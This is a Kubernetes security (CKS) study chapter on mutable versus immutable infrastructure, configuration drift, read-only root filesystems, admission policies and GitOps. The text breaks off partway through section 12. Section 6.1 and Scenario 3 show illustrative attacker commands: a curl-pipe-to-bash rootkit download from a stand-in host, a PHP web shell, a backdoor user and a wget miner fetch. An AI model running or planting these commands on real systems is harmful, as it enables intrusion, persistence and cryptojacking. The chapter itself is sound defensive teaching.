# Mutable vs Immutable Infrastructure

> **Module:** Monitoring, Logging and Runtime Security
> **Chapter:** 5 of 6
> **Scope:** Mutable vs immutable infrastructure paradigms, configuration drift, containerised immutability, Kubernetes enforcement mechanisms, GitOps, and the security case for immutability.

---

## Table of Contents

1. [The Core Paradigm Shift](#1-the-core-paradigm-shift)
2. [Mutable Infrastructure — In-Place Updates](#2-mutable-infrastructure--in-place-updates)
3. [Configuration Drift — The Mutable Failure Mode](#3-configuration-drift--the-mutable-failure-mode)
4. [Immutable Infrastructure — Replace, Don't Modify](#4-immutable-infrastructure--replace-dont-modify)
5. [Containers and Immutability](#5-containers-and-immutability)
6. [Why Mutability Is a Security Problem](#6-why-mutability-is-a-security-problem)
7. [Enforcing Immutability in Kubernetes](#7-enforcing-immutability-in-kubernetes)
8. [Immutable Image Pipeline — From Code to Container](#8-immutable-image-pipeline--from-code-to-container)
9. [GitOps — The Organisational Pattern for Immutability](#9-gitops--the-organisational-pattern-for-immutability)
10. [As a DevSecOps / K8s Security Engineer](#10-as-a-devsecops--k8s-security-engineer)
11. [Real Present-Day Scenarios](#11-real-present-day-scenarios)
12. [What Happens If You Don't Follow This](#12-what-happens-if-you-dont-follow-this)
13. [Most Common Commands and Syntax](#13-most-common-commands-and-syntax)
14. [Other Tools and Services Available](#14-other-tools-and-services-available)
15. [How AI Is Impacting This Area](#15-how-ai-is-impacting-this-area)
16. [CKS Exam Tips](#16-cks-exam-tips)
17. [Links and References](#17-links-and-references)

---

## 1. The Core Paradigm Shift

Mutable and immutable infrastructure represent two fundamentally different answers to the same question: **how do you change software running in production?**

```
MUTABLE APPROACH
───────────────────────────────────────────────────────
Server exists → SSH in → change software → server continues
"Treat servers like pets — nurse them back to health when sick"


IMMUTABLE APPROACH
───────────────────────────────────────────────────────
Server exists → build new server with updated software →
switch traffic → decommission old server
"Treat servers like cattle — replace them when you need a change"
```

The "pets vs cattle" metaphor, originally coined by Randy Bias, captures the philosophical difference:

| Dimension | Pets (Mutable) | Cattle (Immutable) |
|---|---|---|
| Servers are | Unique, named, hand-crafted | Numbered, identical, replaceable |
| When broken | Fixed in place | Terminated and replaced |
| Configuration | Drifts over time | Defined at build time, frozen |
| Updates | Applied to running system | New image, new deployment |
| Debugging | SSH in and investigate | Inspect logs from dead containers |
| Reproducibility | Hard (snowflake servers) | Perfect (same image = same behaviour) |
| Security | Attack surface grows over time | Attack surface is reset on every deploy |

This chapter is foundational for the CKS because Kubernetes is built entirely around the immutable model. Understanding immutability is understanding Kubernetes security at its deepest level.

---

## 2. Mutable Infrastructure — In-Place Updates

### 2.1 The Classic Mutable Pattern

Consider three web servers, each running Nginx 1.17. A new version (1.19) is released with security patches and performance improvements. In a mutable model, you update the software on the existing servers in place.

The update can be triggered manually or via automation:

```bash
# Manual update (SSH into each server)
ssh web-server-1
apt-get install -y nginx=1.19.*
systemctl restart nginx

ssh web-server-2
apt-get install -y nginx=1.19.*
systemctl restart nginx

ssh web-server-3
apt-get install -y nginx=1.19.*
systemctl restart nginx
```

Or via configuration management tools:

```yaml
# Ansible playbook: update Nginx
- hosts: web_servers
  tasks:
    - name: Install Nginx 1.19
      apt:
        name: "nginx=1.19.*"
        state: present
      notify: restart nginx

  handlers:
    - name: restart nginx
      service:
        name: nginx
        state: restarted
```

![Three servers being updated to v1.19 using Scripts and Ansible automation](https://kodekloud.com/kk-media/image/upload/v1752871682/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-Mutable-vs-Immutable-Infrastructure/frame_50.jpg)

*KodeKloud: Three servers being updated to Nginx v1.19 via Scripts and Ansible — classic mutable in-place update pattern.*

### 2.2 Tools That Enable Mutable Infrastructure

The traditional infrastructure ecosystem is built around mutable operations:

| Tool | Category | Mutable Operation |
|---|---|---|
| Ansible | Configuration management | Apply playbooks to running servers |
| Chef | Configuration management | Converge node to desired state |
| Puppet | Configuration management | Apply manifests to running agents |
| SaltStack | Configuration management | Push state to minions |
| SSH + scripts | Manual | Direct system modification |
| `apt`/`yum`/`dnf` | Package management | Update packages in place |
| `systemctl` | Service management | Restart/reload running services |

### 2.3 Where Mutable Infrastructure Is Still Used

Mutable infrastructure hasn't disappeared — it's still appropriate in certain contexts:

- **Stateful systems**: Databases (PostgreSQL, MySQL) are often updated in place because their data volumes make them inherently stateful
- **Long-running legacy systems**: Ancient applications with complex configuration histories that can't easily be containerised
- **Development environments**: Developer laptops, where `apt upgrade` is the norm
- **Configuration tweaks**: Minor config changes that don't warrant a full image rebuild
- **Emergency patching**: Zero-day vulnerability patching where speed overrides consistency

The key insight: **stateless workloads should be immutable; stateful workloads require careful consideration.**

---

## 3. Configuration Drift — The Mutable Failure Mode

Configuration drift is what happens when in-place updates fail on some systems but not others, leaving the fleet in an inconsistent state. It is the defining failure mode of mutable infrastructure.

### 3.1 How Drift Happens

```
Initial State:       server1=Nginx1.17  server2=Nginx1.17  server3=Nginx1.17
                                         ↓
Run upgrade:         server1=SUCCESS     server2=SUCCESS    server3=FAILED
                                         ↓
Post-upgrade state:  server1=Nginx1.19  server2=Nginx1.19  server3=Nginx1.18 ← DRIFT
```

![Configuration Drift showing three servers — two running v1.19 and one stuck at v1.18](https://kodekloud.com/kk-media/image/upload/v1752871683/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-Mutable-vs-Immutable-Infrastructure/frame_170.jpg)

*KodeKloud: Configuration Drift — two servers updated successfully to v1.19, while server3 failed and remains at v1.18.*

### 3.2 Root Causes of Configuration Drift

| Cause | Example |
|---|---|
| Missing dependencies | Server3 lacks a required library that Server1/2 have |
| Disk space | Server3's `/var` is full; package install fails |
| Network issues | Server3 couldn't reach the package repository |
| OS version difference | Server3 runs Ubuntu 18.04, others run 20.04 |
| Previous manual changes | Someone manually installed a conflicting package on Server3 |
| Failed partial updates | Update started but was interrupted, leaving partially upgraded state |
| Human error | Sysadmin skipped Server3 intentionally, then forgot |
| Dependency conflicts | Update on Server3 conflicts with another installed package |

### 3.3 The Cascading Problems of Configuration Drift

Drift is not just an inconvenience — it creates compounding problems over time:

**Troubleshooting complexity:** When Server3 behaves differently from Server1 and Server2, debugging becomes a three-way comparison exercise. "Is this a bug or is it just Server3's quirky config?"

**Security vulnerability exposure:** If the upgrade from 1.18 to 1.19 patches a critical CVE, Server3 remains vulnerable while the rest of the fleet is protected. You might not even know Server3 is drifted.

**Unpredictable next upgrades:** When you try to upgrade from 1.19 to 1.21, Server3 needs to handle a different upgrade path (1.18 → 1.21 vs 1.19 → 1.21). Dependency resolution becomes version-specific.

**Audit failures:** "Are all servers running a patched version?" becomes difficult to answer confidently when drift is present.

**"Snowflake servers":** Over months and years of in-place changes, each server accumulates a unique history of modifications. You don't actually know what's running on Server3 — you only know what was intended. The actual state might diverge significantly from the intended state.

### 3.4 The Accumulative Nature of Drift

```
Month 1:   Server3 has 1 drift item (old Nginx)
Month 3:   Server3 has 4 drift items (old Nginx + missing cert + old OpenSSL + custom cron)
Month 6:   Server3 has 11 drift items — no one knows all of them
Month 12:  Server3 is a "snowflake" — too dangerous to upgrade, too risky to decommission
```

This is how "you can't touch that server" situations emerge. The server becomes so bespoke that any change risks breaking it, and it stays in production forever running outdated, vulnerable software.

---

## 4. Immutable Infrastructure — Replace, Don't Modify

### 4.1 The Immutable Update Pattern

In an immutable model, when Nginx 1.19 is released:

```
1. BUILD:  Create a new server image with Nginx 1.19 (via Packer, Docker, etc.)
2. TEST:   Validate the new image in staging
3. DEPLOY: Provision new servers from the 1.19 image
4. SWITCH: Route traffic to new servers
5. DECOMMISSION: Terminate old 1.17 servers
```

At no point is an existing server modified. The old servers run 1.17 until they are terminated; the new servers run 1.19 from their first moment of existence.

![Three identical server icons labeled v1.18 — immutable infrastructure ensures all servers are identical](https://kodekloud.com/kk-media/image/upload/v1752871684/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-Mutable-vs-Immutable-Infrastructure/frame_220.jpg)

*KodeKloud: Immutable Infrastructure — all three servers run identical v1.18, provisioned from the same image. No drift possible.*

### 4.2 Why Drift is Structurally Impossible in Immutable Infrastructure

If Server1 and Server3 are both provisioned from the same `nginx-1.19` image, they are **provably identical** at the filesystem level. They will behave identically because there is no mechanism to make them different — no one SSHes in, no package manager runs post-deploy, no scripts make local changes.

```
Image A (nginx:1.17)  →  Server1, Server2, Server3     (all identical, all 1.17)
         ↓
Image B (nginx:1.19)  →  Server4, Server5, Server6     (all identical, all 1.19)
         ↓
Decommission Server1, Server2, Server3
```

The fleet is now entirely Server4-6, all running 1.19, all identical. Configuration drift cannot occur because the only way to change a server is to replace it with one built from a new image.

### 4.3 The Image as the Source of Truth

In immutable infrastructure, **the image is the authoritative definition of the system**. This has profound implications:

- The image is version-controlled (tagged by Git SHA, date, or semantic version)
- The image is auditable (you know exactly what's in it — every package, every config file)
- The image is reproducible (build the same image from the same Dockerfile → identical result)
- The image is testable before production (scan for CVEs, validate config, run integration tests)

### 4.4 Immutable Infrastructure at the Server Level (VMs)

Tools for building immutable VM images:

```hcl
# Packer: Build an immutable VM image with Nginx 1.19
source "amazon-ebs" "nginx" {
  ami_name      = "nginx-1.19-{{timestamp}}"
  instance_type = "t3.small"
  source_ami    = "ami-0abcdef1234567890"  # Base Ubuntu
}

build {
  sources = ["source.amazon-ebs.nginx"]

  provisioner "shell" {
    inline = [
      "apt-get update",
      "apt-get install -y nginx=1.19.*",
      "systemctl enable nginx"
    ]
  }
}
```

The resulting AMI is immutable — it captures the exact state at build time. Launching 100 instances from this AMI gives you 100 identical servers.

---

## 5. Containers and Immutability

Containers are the natural embodiment of immutable infrastructure. Every container instance is spawned from an image, and the image is built at a specific point in time from a specific Dockerfile. The container filesystem at startup is defined by the image — not by runtime modifications.

### 5.1 Updating via Image Update (Not Container Modification)

When you want to upgrade Nginx from 1.18 to 1.19 in a containerised environment, the correct immutable approach modifies the **Dockerfile**, not a running container:

```dockerfile
# Before: Nginx 1.18
FROM nginx:1.18
COPY nginx.conf /etc/nginx/nginx.conf
ENTRYPOINT ["sh", "entrypoint.sh"]
```

```dockerfile
# After: Nginx 1.19 — change only the FROM line
FROM nginx:1.19
COPY nginx.conf /etc/nginx/nginx.conf
ENTRYPOINT ["sh", "entrypoint.sh"]
```

The update process:
```bash
# 1. Modify Dockerfile (change FROM nginx:1.18 to FROM nginx:1.19)
# 2. Build new image
docker build -t company/webapp:nginx-1.19 .

# 3. Push to registry
docker push company/webapp:nginx-1.19

# 4. Update Kubernetes Deployment
kubectl set image deployment/webapp webapp=company/webapp:nginx-1.19

# 5. Kubernetes rolls out new containers (rolling update)
kubectl rollout status deployment/webapp
```

Kubernetes handles the rolling update automatically — it replaces old pods with new ones without downtime, following the Deployment's `strategy` configuration.

### 5.2 The Wrong Way — Modifying a Running Container

It is technically possible to modify a running container:

```bash
# BAD: Upgrading Nginx inside a running container
kubectl exec -it nginx-pod -- bash
apt-get update && apt-get install -y nginx=1.19.*

# BAD: Copying files into a running container
kubectl cp nginx.conf nginx-pod:/etc/nginx/nginx.conf

# BAD: Using docker exec to modify container state
docker exec -it <container-id> sh
echo "manual change" > /etc/nginx/conf.d/custom.conf
```

**Why this is dangerous:**

1. **Changes are ephemeral** — when the pod is deleted and recreated (upgrade, node failure, OOM kill), the container starts from the original image. Your manual changes are lost.

2. **Configuration drift returns** — if you modify Pod A but not Pods B and C, you're back to the mutable world's problems.

3. **Audit trail breaks** — there is no record of what was changed inside the container. You can't answer "what is running in production right now?" confidently.

4. **Security risk amplified** — if an attacker can `exec` into your container and install tools or modify configs, and those changes persist until the next deployment, they have an extended window of persistence. Immutable containers limit attacker persistence to the lifetime of the current container.

5. **Image trust broken** — the running container no longer matches the image it was spawned from. The image's CVE scan results, SBOM, and Cosign signature are no longer accurate for what's actually running.

### 5.3 Kubernetes Rolling Update — The Immutable Deployment Mechanism

```yaml
# Deployment with immutable update strategy
apiVersion: apps/v1
kind: Deployment
metadata:
  name: webapp
spec:
  replicas: 3
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1          # Create 1 new pod before killing old ones
      maxUnavailable: 0    # Never have fewer than 3 running pods
  selector:
    matchLabels:
      app: webapp
  template:
    metadata:
      labels:
        app: webapp
    spec:
      containers:
      - name: webapp
        image: company/webapp:nginx-1.19    # ← Change this line to update
        imagePullPolicy: Always             # Always pull from registry
```

When you change the image tag and `kubectl apply`, Kubernetes:
1. Creates a new pod with the new image
2. Waits for it to become Ready
3. Terminates one old pod
4. Repeats until all pods are on the new image
5. Old pods are never modified — they are replaced

### 5.4 Image Tags — The Immutability Anchor

Image tags are the mechanism for identifying specific immutable versions:

```
company/webapp:latest           ← BAD: "latest" is mutable — the underlying image changes
company/webapp:nginx-1.19       ← BETTER: version tag, but still mutable (can be overwritten)
company/webapp:nginx-1.19-1234  ← GOOD: version + build number
company/webapp@sha256:abc123... ← BEST: digest pinning — cryptographically immutable
```

Digest-pinned references (`@sha256:...`) are the gold standard for immutability because no human can accidentally overwrite a digest. The image the digest refers to cannot change — if the registry content changes, the digest changes.

```yaml
# Production: digest-pinned image reference
spec:
  containers:
  - name: webapp
    image: nginx@sha256:4d4d8bef8b4f2f2f3a4e3c5e7b8d3f9a2e1c4b7d8e9f0a1b2c3d4e5f6a7b8c9d
```

### 5.5 Distroless and Scratch Images — Maximum Immutability

The ultimate expression of container immutability: images that contain **only the application binary and its runtime dependencies** — no shell, no package manager, no apt, no curl.

```dockerfile
# Multi-stage build — distroless final image
FROM golang:1.22 AS builder
WORKDIR /app
COPY . .
RUN go build -o /server ./cmd/server

# Final stage: Google distroless (no shell, no package manager)
FROM gcr.io/distroless/static-debian12
COPY --from=builder /server /server
ENTRYPOINT ["/server"]
```

**Implications for immutability and security:**
- No shell → `kubectl exec` produces an error, enforcing immutability by physical constraint
- No package manager → no `apt install` possible inside the container
- No curl/wget → no downloading of secondary payloads at runtime
- Tiny attack surface → fewer CVEs, smaller image, faster pulls
- Provably immutable → there is literally no mechanism to modify the running container

---

## 6. Why Mutability Is a Security Problem

The security implications of mutable vs. immutable infrastructure are profound and directly relevant to the CKS.

### 6.1 The Attacker's Perspective on Mutable Containers

When an attacker gains code execution inside a mutable container, they can:

```bash
# Install persistence mechanisms
apt-get install -y cron
echo "*/5 * * * * /tmp/beacon.sh" | crontab -

# Install exfiltration tools
apt-get install -y ncat curl wget

# Modify application code
echo 'system($_GET["cmd"])' >> /var/www/html/index.php

# Install a rootkit
curl -s http://attacker.io/rootkit.sh | bash

# Create backdoor user
useradd -m -s /bin/bash hacker && echo "hacker:password" | chpasswd
```

All of these attacks require **writing to the container filesystem** — precisely the capability that immutability removes.

### 6.2 Immutability as a Security Control

| Attack | Mutable Container | Immutable Container |
|---|---|---|
| Install malware binary | Possible | Blocked (read-only FS) |
| Modify application code | Possible | Blocked |
| Install reverse shell | Possible | Shell not present |
| Create backdoor user | Possible | `/etc/passwd` read-only |
| Persist cron job | Possible | `/var/spool/cron` read-only |
| Download secondary payload | Possible | `curl`/`wget` not present |
| Modify runtime config | Possible | Config files read-only |

### 6.3 The Forensics Advantage

Immutable infrastructure dramatically simplifies incident response:

**Mutable:** "What did the attacker change? We need to compare the running system to... what? The original install was 18 months ago and has had 300 in-place changes since."

**Immutable:** "What did the attacker change? Compare the running container's filesystem to the image it was spawned from. Any difference = attacker modification."

```bash
# In an immutable container with a read-only filesystem:
# The attacker CANNOT persist changes — every change is lost when the container restarts
# Forensics = just look at the container's logs and ephemeral /tmp

# In a mutable container:
# Changes persist until the container is explicitly replaced
# Forensics requires full filesystem diff against the original image
docker diff <container-id>   # Shows all changes made to the container filesystem
```

### 6.4 Compliance and Auditability

Immutable infrastructure makes compliance audits orders of magnitude simpler:

- **"What software is running in production?"** → The image tag. Every running container from `nginx:1.19@sha256:abc123` runs exactly what's in that image.
- **"Has the production configuration changed?"** → Check the image tags in the Deployment spec. Changes go through Git (GitOps).
- **"Can anyone SSH into production containers and make changes?"** → No. Containers are read-only. `exec` is disabled. 

---

## 7. Enforcing Immutability in Kubernetes

Kubernetes provides several mechanisms to enforce container immutability at the platform level — going beyond convention to technical enforcement.

### 7.1 Read-Only Root Filesystem

The most direct immutability enforcement: make the container's root filesystem read-only at the Pod spec level.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: webapp
spec:
  containers:
  - name: webapp
    image: company/webapp:1.0
    securityContext:
      readOnlyRootFilesystem: true    # ← Enforces immutability
```

With `readOnlyRootFilesystem: true`:
- Any write to the container filesystem returns `EROFS: Read-only file system`
- Package managers cannot install software
- Malware cannot write itself to disk
- Config files cannot be modified
- The container's filesystem state at death is identical to its state at birth

**The challenge:** Many applications legitimately need to write somewhere (logs, temp files, caches). The solution is explicit volume mounts for mutable directories:

```yaml
spec:
  containers:
  - name: webapp
    image: company/webapp:1.0
    securityContext:
      readOnlyRootFilesystem: true
    volumeMounts:
    - name: tmp-dir
      mountPath: /tmp            # Allow writes to /tmp
    - name: cache-dir
      mountPath: /var/cache/app  # Allow writes to cache
    - name: logs-dir
      mountPath: /var/log/app    # Allow log writes
  volumes:
  - name: tmp-dir
    emptyDir: {}                 # Ephemeral, dies with the pod
  - name: cache-dir
    emptyDir: {}
  - name: logs-dir
    emptyDir: {}
```

This gives applications the writable space they need while keeping the OS filesystem, application binaries, and configs read-only.

### 7.2 Disabling exec Access

Even with a read-only filesystem, an attacker who can `kubectl exec` into a container might be able to run scripts already present in the image. Disable exec entirely:

```yaml
# Option 1: PodSecurityPolicy (deprecated in K8s 1.25)
# Option 2: OPA Gatekeeper constraint
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPAllowedUsers
...

# Option 3: Kyverno policy to deny exec
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: deny-exec-in-pod
spec:
  rules:
  - name: deny-exec
    match:
      resources:
        kinds:
        - PodExecOptions
    validate:
      message: "Exec into pods is not allowed in production"
      deny:
        conditions:
        - key: "{{request.namespace}}"
          operator: Equals
          value: production
```

### 7.3 Pod Security Standards — Baseline and Restricted

Kubernetes built-in Pod Security Standards enforce immutability-related controls:

```yaml
# Label a namespace to enforce Restricted security profile
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted       # Enforced
    pod-security.kubernetes.io/audit: restricted         # Audited
    pod-security.kubernetes.io/warn: restricted          # Warned

# The "restricted" profile requires (among other things):
# - securityContext.runAsNonRoot: true
# - securityContext.readOnlyRootFilesystem: true (optional but encouraged)
# - securityContext.allowPrivilegeEscalation: false
# - No privileged containers
```

### 7.4 `imagePullPolicy: Always`

Ensuring Kubernetes always pulls from the registry (not a local cache) means the image tag always refers to exactly what's in the registry:

```yaml
spec:
  containers:
  - name: webapp
    image: company/webapp:1.0
    imagePullPolicy: Always    # Never use cached image
```

Combined with digest pinning (`@sha256:`), this guarantees what's running is exactly what was scanned and approved.

### 7.5 Admission Control Enforcement

Use OPA Gatekeeper or Kyverno to enforce immutability policies at admission time:

```yaml
# Kyverno: Require readOnlyRootFilesystem on all containers in production
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-readonly-rootfs
spec:
  rules:
  - name: check-readonly-rootfs
    match:
      resources:
        kinds:
        - Pod
        namespaces:
        - production
    validate:
      message: "Production containers must use readOnlyRootFilesystem: true"
      pattern:
        spec:
          containers:
          - securityContext:
              readOnlyRootFilesystem: true
```

### 7.6 Image Pinning Policy

```yaml
# Kyverno: Require digest-pinned image references
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-image-digest
spec:
  rules:
  - name: require-digest
    match:
      resources:
        kinds: [Pod]
        namespaces: [production]
    validate:
      message: "Images must be pinned with a SHA digest"
      pattern:
        spec:
          containers:
          - image: "*@sha256:*"    # Must contain @sha256:
```

---

## 8. Immutable Image Pipeline — From Code to Container

A production immutable infrastructure requires a complete pipeline that ensures the immutability contract is maintained from development through production.

```
Developer pushes code to Git
         │
         ▼
CI pipeline triggered (GitHub Actions, Jenkins, GitLab CI)
         │
         ├── Static analysis (SAST)
         ├── Unit tests
         ├── Build Docker image
         │     docker build -t company/app:${GIT_SHA} .
         │
         ├── Vulnerability scan (Trivy)
         │     trivy image --exit-code 1 --severity CRITICAL company/app:${GIT_SHA}
         │
         ├── SBOM generation (Syft)
         │     syft company/app:${GIT_SHA} -o cyclonedx-json > sbom.json
         │
         ├── Image signing (Cosign)
         │     cosign sign company/app:${GIT_SHA}
         │
         └── Push to registry
               docker push company/app:${GIT_SHA}
               docker push company/app:${GIT_SHA}@<digest>
                        │
                        ▼
                GitOps repo updated (Flux/ArgoCD)
                         │
                         ▼
                Kubernetes applies new Deployment
                (rolling update — old pods replaced, not modified)
                         │
                         ▼
                Production running company/app:${GIT_SHA}@sha256:...
                (immutable, signed, scanned, auditable)
```

### 8.1 The Dockerfile as Infrastructure Code

```dockerfile
# Immutable-first Dockerfile principles:

# 1. Pin base image to a digest (not just a tag)
FROM ubuntu:22.04@sha256:f9d633ff6640178c2d0525017174a688e2c1aef28f0a0130b26bd5554491f0da

# 2. Minimise layers and install what you need in one RUN
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
      nginx=1.22.* \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*   # Remove package cache — reduces attack surface

# 3. Copy config from build context (not downloaded at runtime)
COPY nginx.conf /etc/nginx/nginx.conf
COPY --chown=nginx:nginx html/ /usr/share/nginx/html/

# 4. Run as non-root
USER nginx

# 5. No entrypoint scripts that download from internet
ENTRYPOINT ["nginx", "-g", "daemon off;"]

# NEVER: RUN curl http://example.com/setup.sh | bash
# NEVER: ENTRYPOINT ["sh", "-c", "wget $RUNTIME_SCRIPT && bash $RUNTIME_SCRIPT"]
```

### 8.2 Multi-Stage Build for Minimal Attack Surface

```dockerfile
# Stage 1: Build
FROM golang:1.22-alpine AS builder
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download                    # Download deps at build time, not runtime
COPY . .
RUN CGO_ENABLED=0 go build -o /server ./cmd/server

# Stage 2: Run — minimal final image
FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=builder /server /server
USER nonroot
ENTRYPOINT ["/server"]

# Result:
# - No shell (bash, sh, zsh not present)
# - No package manager
# - No runtime dependency download
# - Container cannot be "shelled into"
# - Only /server binary and its static dependencies
```

---

## 9. GitOps — The Organisational Pattern for Immutability

GitOps is the operational model that makes immutable infrastructure manageable at scale. It treats the Git repository as the single source of truth for all infrastructure state.

### 9.1 GitOps Principles

```
1. Declarative: All desired system state is expressed declaratively (Kubernetes manifests, Helm values)
2. Versioned: Desired state is stored in Git (version-controlled, auditable)
3. Pulled: Automated agents (Flux, ArgoCD) pull from Git and apply to cluster
4. Reconciled: Automated agents continuously ensure cluster state matches Git state
```

### 9.2 GitOps Workflow

```
Developer changes image tag in Git:
  webapp/deployment.yaml: image: company/app:1.18 → company/app:1.19

         ↓ Git commit + PR + review + merge

ArgoCD/Flux detects change in Git
         ↓
Applies new Deployment to Kubernetes
         ↓
Kubernetes rolls out new pods (immutable replace)
         ↓
Old pods (1.18) terminated, new pods (1.19) running
```

**The key security property:** No one can change what's running in production without going through Git. Every change is:
- Reviewed (PR review process)
- Auditable (Git commit history with author and timestamp)
- Reversible (`git revert` → cluster rolls back)
- Automated (no manual `kubectl apply` in production)

### 9.3 GitOps Tools

| Tool | Model | Approach |
|---|---|---|
| **ArgoCD** | Pull-based | Monitors Git, applies to cluster, provides UI |
| **Flux CD** | Pull-based | Lightweight, CNCF graduated, CLI-focused |
| **Tekton** | Push-based | CI/CD pipeline that pushes to cluster |
| **Jenkins X** | Push-based + GitOps | Opinionated CI/CD with GitOps built in |

### 9.4 Drift Detection with GitOps

GitOps tools continuously compare the desired state (Git) with the actual state (cluster). Any drift — including manual `kubectl apply` or `kubectl exec` modifications — is detected and can be automatically remediated:

```yaml
# ArgoCD Application: auto-sync and auto-remediate drift
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: webapp
spec:
  project: production
  source:
    repoURL: https://github.com/company/k8s-manifests
    path: apps/webapp
    targetRevision: main
  destination:
    server: https://kubernetes.default.svc
    namespace: production
  syncPolicy:
    automated:
      prune: true       # Delete resources removed from Git
      selfHeal: true    # Revert any manual changes made outside Git
```

With `selfHeal: true`, if someone manually runs `kubectl edit deployment/webapp` and changes the image tag, ArgoCD will detect the drift within seconds and revert it back to the Git-declared state.

---

## 10. As a DevSecOps / K8s Security Engineer

### 10.1 The Security Engineer's Immutability Checklist

When reviewing a Kubernetes deployment for immutability compliance:

```
□ readOnlyRootFilesystem: true on all containers
□ Image pinned to digest (not just tag)
□ imagePullPolicy: Always
□ No capability to exec into pods in production (RBAC or policy)
□ No emptyDir volumes that could be used for tool staging
□ runAsNonRoot: true
□ allowPrivilegeEscalation: false
□ Image built in CI (not on developer laptop)
□ Image scanned before push
□ Image signed (Cosign) and signature verified at admission
□ GitOps controls all production deployments (no kubectl apply manually)
□ No secrets in image layers (use Secrets volumes or ESO)
□ SBOM generated and stored
```

### 10.2 The Conversation with Development Teams

Developers often push back against immutability because it changes their debugging workflow. Common objections and responses:

**"How do I debug production issues if I can't exec into the container?"**
→ Use ephemeral debug containers (`kubectl debug -it <pod> --image=busybox --target=<container>`)
→ Use structured logging and distributed tracing — you shouldn't need a shell to debug well-instrumented code
→ In emergencies, deploy a temporary debug namespace with relaxed policies

**"My application needs to write its config at startup"**
→ Use ConfigMaps and Secrets mounted as volumes — they're writable by Kubernetes, not the container
→ Move config templating to an init container that writes to an emptyDir volume the main container reads

**"Rolling updates are too slow for our rapid iteration"**
→ This is a deployment speed problem, not an immutability problem — optimise image build and push times
→ Use feature flags to decouple code deployment from feature release

### 10.3 Measuring Immutability Maturity

| Level | Description | Metrics |
|---|---|---|
| 0 — None | Fully mutable; direct server modification | 100% mutable changes |
| 1 — Partial | Some containers use `readOnlyRootFilesystem` | <50% containers immutable |
| 2 — Standard | All prod containers read-only; GitOps for deployments | >90% containers immutable |
| 3 — Advanced | Digest pinning, Cosign signing, exec disabled, distroless images | 100% immutable + signed |
| 4 — Maximum | All of Level 3 + supply chain attestation + SLSA Level 3 | Cryptographic provenance |

### 10.4 Incident Response in Immutable vs Mutable Environments

| Phase | Mutable | Immutable |
|---|---|---|
| Detect | Hard (changes blend with normal mutations) | Easy (any runtime change is anomalous — Falco catches it) |
| Contain | Risk of removing evidence during cleanup | Kill the pod — it restarts clean from the image |
| Forensics | Complex filesystem diff against unknown baseline | Simple: image is the baseline, compare running container |
| Remediate | Patch running system (may not fully clean) | Update image, redeploy — guaranteed clean |
| Confidence | Low (snowflake server history is unknown) | High (image is the authoritative truth) |

---

## 11. Real Present-Day Scenarios

### Scenario 1: The SolarWinds-Style Supply Chain Attack (2020 Style, Still Relevant)

The SolarWinds attack inserted malicious code into the build process. In a mutable environment, the malicious binary could modify running services, install persistence mechanisms, and access other systems — all changes persisting on the mutated servers.

**Immutable response:** Even if a malicious image is deployed, if containers have:
- `readOnlyRootFilesystem: true` → The malware cannot install persistence
- Short container lifetimes (rolling deploys every week) → Even if the container is compromised, it's replaced soon
- Falco monitoring syscalls → The moment the malicious code tries to write to disk, Falco alerts
- Cosign image verification → The malicious image fails signature verification at admission

The combination doesn't prevent the attack from reaching production, but it dramatically limits blast radius and persistence.

### Scenario 2: Configuration Drift Causing a Production Outage

A retail company runs 50 web servers. Over 2 years of in-place updates, configuration drift accumulates. Server 23 has an old version of OpenSSL that doesn't support a TLS cipher suite the load balancer starts requiring. Server 23 begins rejecting connections silently.

**Resolution:** Takes 4 hours to debug because the symptom (intermittent failures) only occurs on 1/50 servers. Root cause analysis is complex.

**Immutable prevention:** All 50 servers run from the same AMI. OpenSSL is updated by building a new AMI and replacing all servers simultaneously. They are guaranteed identical — intermittent-by-one-server bugs are structurally impossible.

### Scenario 3: Real Attack Blocked by `readOnlyRootFilesystem`

A Node.js application has a prototype pollution vulnerability. The attacker sends a crafted request that executes `child_process.exec("wget http://attacker.io/miner > /tmp/miner && chmod +x /tmp/miner && /tmp/miner")`.

**Mutable container:** wget writes to `/tmp/miner` → chmod executes → miner runs → cryptomining detected hours later.

**Immutable container (readOnlyRootFilesystem: true, no emptyDir /tmp):** wget fails with `EROFS: Read-only file system`. The attack chain breaks at the first step. Falco still alerts on the unexpected `wget` execution, but the miner never runs.

### Scenario 4: GitOps Preventing Unauthorized Deployment

A developer with cluster access (`kubectl`) is disgruntled and attempts to deploy a backdoored version of the company's API:

```bash
kubectl set image deployment/api api=hackerimage/backdoored-api:latest
```

**Without GitOps:** This change takes effect immediately. The backdoored image runs in production. The change might not be noticed for days.

**With GitOps (ArgoCD + selfHeal: true):** ArgoCD detects the drift within 30 seconds and reverts the Deployment back to the Git-declared image. The backdoored image runs for less than 30 seconds. An alert is fired (ArgoCD + Prometheus alerting on sync failures). The developer's action is logged in the ArgoCD audit trail with their Kubernetes identity.

### Scenario 5: Zero-Day Patch Deployment at Speed

A critical CVE is disclosed in a library used by all company containers. The company needs to patch all production containers within 4 hours (regulatory requirement).

**Mutable (50 servers):** SSH into all 50 servers, run package updates, restart services. Risk of drift, failed updates, missed servers. 4 hours is tight.

**Immutable (Kubernetes):** Update the base image in the Dockerfile, rebuild all images (parallel CI), push to registry, update all Deployment image tags in Git (one commit), ArgoCD detects changes and rolls out to all clusters simultaneously. Achievable in under 2 hours with high confidence all containers are patched.

---

## 12. What Happens If You Don't Follow This

### The Hidden `kubectl exec` Habit

Engineers get into the habit of SSHing into (or `exec`-ing into) containers to make "quick fixes" in production:

```bash
# Quick fix in production (appears harmless)
kubectl exec -it nginx-pod -- sh
# vi /etc/nginx/nginx.conf  (change a config value)
# nginx -s reload
```

Problems:
1. The change is **not in Git** — no audit trail
